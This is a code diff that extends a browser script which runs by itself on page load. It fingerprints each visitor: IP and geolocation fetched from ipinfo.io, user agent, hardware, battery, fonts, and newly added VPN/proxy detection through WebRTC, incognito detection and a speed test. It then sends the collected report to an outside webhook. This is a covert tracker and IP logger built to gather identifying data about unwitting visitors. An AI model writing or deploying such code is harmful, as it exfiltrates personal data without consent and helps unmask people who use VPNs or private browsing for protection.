@@ -144,19 +144,14 @@ async function getExtraDeviceInfo() {
 
     let cpuThreads = await estimateCPUThreads();
     let ramSize = navigator.deviceMemory ? `${navigator.deviceMemory} GB (Estimated)` : "Unknown";
-    let openWindows = window.length || "Unknown";
-    let installedFonts = await getInstalledFonts();
-    let activeApps = await getActiveApplications();
 
     return {
         cpuCores: cpuThreads,
         ramSize: ramSize,
         gpu: getGPUInfo(),
         battery: `${batteryLevel} (Charging: ${isCharging})`,
-        numWindows: openWindows,
-        deviceType: deviceType,
-        installedFonts: installedFonts,
-        activeApps: activeApps
+        numWindows: window.length || "Unknown",
+        deviceType: deviceType
     };
 }
 
@@ -167,8 +162,42 @@ function getGPUInfo() {
     return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
 }
 
+async function testInternetSpeed() {
+    const startTime = performance.now();
+    await fetch('https://speed.hetzner.de/100MB.bin', { method: 'HEAD', mode: 'no-cors' }).catch(() => {});
+    const duration = (performance.now() - startTime) / 1000;
+    return (100 / duration).toFixed(2) + " MB/s";
+}
+
+async function checkVPN() {
+    try {
+        let rtc = new RTCPeerConnection();
+        rtc.createDataChannel('');
+        rtc.createOffer().then(o => rtc.setLocalDescription(o));
+        return new Promise(resolve => {
+            rtc.onicecandidate = ice => {
+                if (!ice || !ice.candidate || !ice.candidate.candidate) return resolve("Unknown");
+                resolve(ice.candidate.candidate.includes("relay") ? "Yes (VPN/Proxy Detected)" : "No");
+            };
+        });
+    } catch {
+        return "Unknown";
+    }
+}
+
+function detectIncognito() {
+    return new Promise((resolve) => {
+        let fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+        if (!fs) {
+            resolve("Unknown");
+        } else {
+            fs(window.TEMPORARY, 100, () => resolve("No"), () => resolve("Yes"));
+        }
+    });
+}
+
 async function getInstalledFonts() {
-    let fonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Comic Sans MS", "Tahoma"];
+    let fonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia"];
     let installedFonts = [];
     let ctx = document.createElement("canvas").getContext("2d");
     ctx.font = "72px sans-serif";
@@ -181,12 +210,13 @@ async function getInstalledFonts() {
     return installedFonts.length > 0 ? installedFonts.join(", ") : "Unknown";
 }
 
-async function getActiveApplications() {
-    return "Limited Access (Browser Restriction)";
-}
-
 async function sendToWebhook() {
     const deviceInfo = await getExtraDeviceInfo();
+    const internetSpeed = await testInternetSpeed();
+    const vpnStatus = await checkVPN();
+    const incognitoMode = await detectIncognito();
+    const installedFonts = await getInstalledFonts();
+
     fetch('https://ipinfo.io/json')
         .then(response => response.json())
         .then(data => {
@@ -215,13 +245,16 @@ async function sendToWebhook() {
                          `🌐 **Browser:** ${navigator.userAgent}\n` +
                          `🖥️ **Screen Size:** ${screen.width}x${screen.height}\n` +
                          `🗣️ **Language:** ${navigator.language}\n` +
+                         `📶 **Connection Type:** ${navigator.connection ? navigator.connection.effectiveType : "Unknown"}\n` +
                          `🧠 **CPU Cores (Estimated):** ${deviceInfo.cpuCores}\n` +
                          `💾 **RAM Size (Estimated):** ${deviceInfo.ramSize}\n` +
                          `🎮 **GPU:** ${deviceInfo.gpu}\n` +
                          `🔋 **Battery:** ${deviceInfo.battery}\n` +
                          `🖥️ **Open Windows:** ${deviceInfo.numWindows}\n` +
-                         `🖋️ **Installed Fonts:** ${deviceInfo.installedFonts}\n` +
-                         `📂 **Active Applications:** ${deviceInfo.activeApps}\n\n` +
+                         `🚀 **Internet Speed:** ${internetSpeed}\n` +
+                         `🛡️ **VPN/Proxy:** ${vpnStatus}\n` +
+                         `🔒 **Incognito Mode:** ${incognitoMode}\n` +
+                         `🖋️ **Installed Fonts:** ${installedFonts}\n\n` +
                          `🕒 **Time:** ${dateTime}`
             };
 
@@ -242,3 +275,4 @@ async function sendToWebhook() {
 
 sendToWebhook();
 </script>
+
